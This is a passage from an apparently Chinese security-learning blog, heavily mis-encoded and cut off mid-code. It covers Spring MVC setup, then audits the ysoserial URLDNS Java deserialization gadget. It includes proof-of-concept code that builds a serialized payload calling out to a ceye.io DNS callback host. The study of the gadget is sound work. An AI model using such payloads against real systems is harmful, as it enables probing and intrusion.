xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"top.bycsec"</span>&gt;</span><span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.web.servlet.view.InternalResourceViewResolver"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"prefix"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>/<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"suffix"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>.jsp<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥æ‰«ætop.bycsecåŒ…ååˆ†æ–¹ä¾¿ã€‚ç°åœ¨æˆ‘ä»¬è®¿é—®<code>/model</code>è·¯ç”±<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/30.PNG" class="lazyload" data-srcset="30.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>æœ€ç»ˆé¡¹ç›®è·¯å¾„<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/31.PNG" class="lazyload" data-srcset="31.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å¦‚æœè¦åœ¨ä¸Šé¢åŸºç¡€ä¸Šæ¥å—å‚æ•°æˆ–è€…è®¾ç½®è·¯ç”±åŸºæœ¬è·Ÿservletå·®ä¸å¤š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/user"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line">    <span class="comment">// å®é™…URLæ˜ å°„æ˜¯/user/profile</span></span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/profile"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ModelAndView <span class="title">profile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®é™…URLæ˜ å°„æ˜¯/user/changePassword</span></span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/changePassword"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ModelAndView <span class="title">changePassword</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping</span>(<span class="string">"/signin"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ModelAndView <span class="title">doSignin</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        @RequestParam(<span class="string">"email"</span>)</span> String email,</span></span><br><span class="line"><span class="function">        @<span class="title">RequestParam</span><span class="params">(<span class="string">"password"</span>)</span> String password,</span></span><br><span class="line"><span class="function">        HttpSession session) </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‡å¦‚ç¼–å†™çš„æ˜¯å¤§é‡æ¥å£çš„ä»£ç (rest api)ã€‚springè¿˜æä¾›äº†<code>@RestController</code>æ¥ä»£æ›¿<code>@Controller</code>.è¿™æ ·æ¥å£çš„æ–¹æ³•è‡ªåŠ¨å˜æˆapiæ–¹æ³•ã€‚æ•°æ®ä¹Ÿæ˜¯restapiçš„jsonæ•°æ®ã€‚</p><h2 id="Audit"><a href="#Audit" class="headerlink" title="Audit"></a>Audit</h2><p>è¿™ä¸€éƒ¨åˆ†ç”¨äºå­¦ä¹ javaä»£ç å®¡è®¡ä¸­ä¸€äº›å¸¸è§æ¼æ´çš„æ·±å±‚åŸç†ã€‚æ¯”å¦‚ä¹‹å‰ååºåˆ—åŒ–ä¸­åˆ©ç”¨é“¾çš„æ·±å±‚åŸå› è¿˜æ²¡æœ‰å…¨éƒ¨å­¦æ¸…æ¥šã€‚ä¸€äº›ç‰¹å®šæƒ…å†µä¸‹çš„payloadç¼–å†™ä¹Ÿè¿˜éœ€è¦åŸºç¡€çŸ¥è¯†ä½œä¸ºåº•å±‚æ”¯æŒã€‚</p><p>çœŸæ­£æ¥è§¦äº†å®æˆ˜æ‰ä¼šå‘ç°javaåœ¨ç°åœ¨ä»æ—§æ˜¯å»ºç«™çš„é¦–é€‰ï¼Œå¹¶ä¸”å¾€å¾€å¯ä»¥æ‹¿åˆ°æƒé™è¾ƒé«˜çš„shell.ä¹Ÿå¹¸å¥½æœ€è¿‘æ¥è§¦javaç›¸å¯¹æ›´å¤šäº†ç‚¹ï¼Œæ‰€ä»¥æ‰æœ‰èƒ†é‡å»æ¢ç©¶è¿™äº›æ¼æ´åˆ©ç”¨çš„åº•å±‚ã€‚</p><h3 id="deserialization-gadgets"><a href="#deserialization-gadgets" class="headerlink" title="deserialization gadgets"></a>deserialization gadgets</h3><p>å…ˆä»ysoserialpayloadåˆ©ç”¨é“¾çš„åŸç†å¼€å§‹å®¡è®¡ã€‚</p><p>æ ¹æ®æˆ‘ä»¬æœ€æ—©å­¦ä¹ åˆ°çš„javaååºåˆ—åŒ–åŸç†ã€‚æˆ‘ä»¬çŸ¥é“,åºåˆ—åŒ–åˆ©ç”¨ç±»å¿…é¡»æ˜¯å®ç°äº†Serializableçš„ã€‚è¿™äº›éƒ½æ˜¯payloadå¯è¡Œçš„å¿…è¦æ¡ä»¶ã€‚æ‰€ä»¥åç»­è¿™ç§ç»†èŠ‚éƒ½ä¸å¿…æã€‚</p><ul><li>URLDNS</li></ul><p>URLDNSå¸¸ç”¨äºæ£€æµ‹ååºåˆ—åŒ–æ¼æ´ã€‚åŸå› å¾ˆç®€å•:<br>1.ä¾èµ–åŸç”Ÿç±»Hashmap<br>2.ä¸ä¾èµ–jdkç‰ˆæœ¬</p><p>æˆ‘ä»¬çœ‹çœ‹Hashmapç±»ã€‚å®ƒå®ç°äº†readObjectæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    reinitialize();</span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Illegal load factor: "</span> +</span><br><span class="line">                                            loadFactor);</span><br><span class="line">    s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">    <span class="keyword">int</span> mappings = s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Illegal mappings count: "</span> +</span><br><span class="line">                                            mappings);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">        <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">        <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">        <span class="keyword">float</span> lf = Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">        <span class="keyword">float</span> fc = (<span class="keyword">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">        <span class="keyword">int</span> cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                    DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                    (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                    MAXIMUM_CAPACITY :</span><br><span class="line">                    tableSizeFor((<span class="keyword">int</span>)fc));</span><br><span class="line">        <span class="keyword">float</span> ft = (<span class="keyword">float</span>)cap * lf;</span><br><span class="line">        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                        (<span class="keyword">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check Map.Entry[].class since it's the nearest public type to</span></span><br><span class="line">        <span class="comment">// what we're actually creating.</span></span><br><span class="line">        SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[]<span class="class">.<span class="keyword">class</span>, <span class="title">cap</span>)</span>;</span><br><span class="line">        <span class="meta">@SuppressWarnings</span>(&#123;<span class="string">"rawtypes"</span>,<span class="string">"unchecked"</span>&#125;)</span><br><span class="line">        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> Node[cap];</span><br><span class="line">        table = tab;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">                K key = (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">                V value = (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…³é”®åœ¨æœ€åä¸€è¡Œçš„putvalã€‚æˆ‘ä»¬å…ˆçœ‹å‘putvalä¸­ä½¿ç”¨äº†çš„hashæ–¹æ³•<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/32.PNG" class="lazyload" data-srcset="32.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>é‡Œé¢hashCodeæ–¹æ³•å–å†³äºä½ çš„keyçš„ç±»ã€‚æ­¤å¤„æ˜¯java.net.URLç±»ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œè·Ÿè¿›è¿™é‡Œçš„handlerå‘ç°è°ƒç”¨çš„æ˜¯java.net.URLStreamHandlerçš„hashCodeã€‚<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/33.PNG" class="lazyload" data-srcset="33.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>çœ‹åˆ°<code>getHostAddress</code>.å°±èƒ½æ˜ç™½æ­¤å¤„è‚¯å®šæ˜¯å¯¹åŸŸåè¿›è¡Œäº†è§£æã€‚æ‰€ä»¥ä¼šå‘å‡ºDNSè¯·æ±‚ã€‚</p><p>ä¸è¿‡ã€‚URLDNSçš„payloadç¼–å†™å¹¶éè¿™ä¹ˆç®€å•çš„ä¸€ä¸ªè°ƒç”¨å°±å®Œäº‹äº†çš„ã€‚åˆšåˆšä¸Šé¢æˆ‘ä»¬çœ‹åˆ°ã€‚<code>hashCode</code>æ–¹æ³•é‡Œå¼ºè°ƒå¦‚æœhashCodeä¸ä¸º-1,åˆ™ç›´æ¥è¿”å›hashCode.è€Œurlç±»ä¸­å®ƒæ˜¯é»˜è®¤ä¸º-1çš„ã€‚<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/34.PNG" class="lazyload" data-srcset="34.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>åˆšåˆšæˆ‘ä»¬è¯´ï¼Œè§¦å‘ç‚¹åœ¨<code>putVal</code>é‚£é‡Œã€‚å®ƒçš„keyæ˜¯é€šè¿‡readObjectè¯»å–å‡ºæ¥çš„ã€‚é‚£è¯´æ˜æˆ‘ä»¬çš„keyå†™å…¥æ—¶æ˜¯é€šè¿‡writeObjectå†™å…¥çš„ã€‚æŒ‰ç…§è¿™ä¸ªçº¿è·¯è·Ÿä¸‹å»,ä¼šå‘ç°keyå€¼æœ€ç»ˆæ¥è‡ªHashMapä¸­tableçš„å€¼ã€‚è€ŒHashMap ä¸­çš„tableå³hashè¡¨æ˜¯é€šè¿‡hashmap.putæ¥å†™å…¥æ•°æ®çš„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¹Ÿè°ƒç”¨äº†hashã€‚é‚£ä¹ˆè¯´æ˜è¿™é‡Œä¹Ÿä¼šè§¦å‘dnsè¯·æ±‚</p><p>æˆ‘ä»¬å¯ä»¥å†™ä¸ªdemo<br>URLDNSçš„payloadç¼–å†™å¹¶éè¿™ä¹ˆç®€å•çš„ä¸€ä¸ªè°ƒç”¨å°±å®Œäº‹äº†çš„ã€‚åˆšåˆšä¸Šé¢æˆ‘ä»¬çœ‹åˆ°ã€‚<code>hashCode</code>æ–¹æ³•é‡Œå¼ºè°ƒå¦‚æœhashCodeä¸ä¸º-1,åˆ™ç›´æ¥è¿”å›hashCode.<br>æ‰€ä»¥æœ¬åœ°å†™è¦å°†putçš„ç¬¬äºŒä¸ªå‚æ•°è®¾ä¸º-1æ‰ä¼šå‘å‡ºdnsè¯·æ±‚ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exp</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">"http://byc.xxx.ceye.io/"</span>);</span><br><span class="line">        map.put(url,-<span class="number">1</span>); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/35.PNG" class="lazyload" data-srcset="35.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æˆ‘ä»¬å¦‚æœåªæƒ³åœ¨å¯¹æ–¹æœºå™¨ä¸Šæ£€æµ‹æ˜¯å¦äº§ç”Ÿdnsè¯·æ±‚ã€‚é‚£ä¹ˆå¿…é¡»å¾—è§„é¿æ‰Hashmap.putè¿™ä¸€æ¬¡è°ƒç”¨æ—¶é‡Œé¢åšå‡ºçš„dnsè¯·æ±‚ã€‚æ–¹æ³•ä¹Ÿå¾ˆç®€å•ã€‚é‚£å°±æ˜¯åœ¨putå‰ä¿®æ”¹URLçš„hashCodeä¸ºå…¶ä»–ä»»æ„å€¼ï¼Œå°±å¯ä»¥åœ¨putæ—¶ä¸è§¦å‘dnsæŸ¥è¯¢</p><p>è¿™ä¸€æ­¥å¯ä»¥é€šè¿‡åå°„æ¥è¾¾æˆã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exp</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">"http://byc.59fevd.ceye.io/"</span>);</span><br><span class="line">        Field f = Class.forName(<span class="string">"java.net.URL"</span>).getDeclaredField(<span class="string">"hashCode"</span>);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(url,<span class="number">123</span>);</span><br><span class="line">        System.out.println(url.hashCode());</span><br><span class="line">        map.put(url,<span class="number">123</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶è°ƒç”¨urlçš„hashCodeç»“æœä¼šè¿”å›123.ä¹Ÿå°±æ˜¯ç›´æ¥è¿”å›äº†æˆ‘ä»¬è®¾ç½®çš„å€¼,é¿å…äº†dnsæŸ¥è¯¢ã€‚</p><p>hashCode è¿™ä¸ªå±æ€§ä¸æ˜¯ transient çš„,è€Œæ˜¯privateçš„ã€‚æ‰€ä»¥æ”¾è¿›å»åè®¾å› -1, è¿™æ ·åœ¨ååºåˆ—åŒ–æ—¶å°±ä¼šé‡æ–°è®¡ç®— hashCode</p><p>å› æ­¤ã€‚æˆ‘ä»¬å®é™…çš„pocå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">"http://byc.59fevd.ceye.io/"</span>);</span><br><span class="line">        Field f = Class.forName(<span class="string">"java.net.URL"</span>).getDeclaredField(<span class="string">"hashCode"</span>);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(url, <span class="number">123</span>);</span><br><span class="line">        map.put(url, <span class="string">"byc_404"</span>);</span><br><span class="line">        f.set(url, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        oos.writeObject(map);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±æˆåŠŸå°†åºåˆ—åŒ–æ•°æ®å†™å…¥out.bin,å¹¶ä¸”æ²¡æœ‰æœ¬åœ°å‘å‡ºdnsè¯·æ±‚ã€‚ç„¶åæˆ‘ä»¬æ¨¡æ‹ŸçœŸå®åœºæ™¯è§¦å‘</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exp</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨p1g3å¸ˆå‚…çš„æ–‡ç« é‡Œè¿˜å¯¹ysoserialçš„payloadè¿›è¡Œäº†åˆ†æã€‚æˆ‘ä»¬ä¸å¦¨ä¹Ÿçœ‹çœ‹ysoçš„jaråŒ…ä¸­æ˜¯å¦‚ä½•ä¹¦å†™çš„(å…¶å®ç›´æ¥å»çœ‹githubä¸Šæºç å¯ä»¥é…åˆæ³¨é‡Šæ›´å¥½é˜…è¯»)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(String url)</span> <span 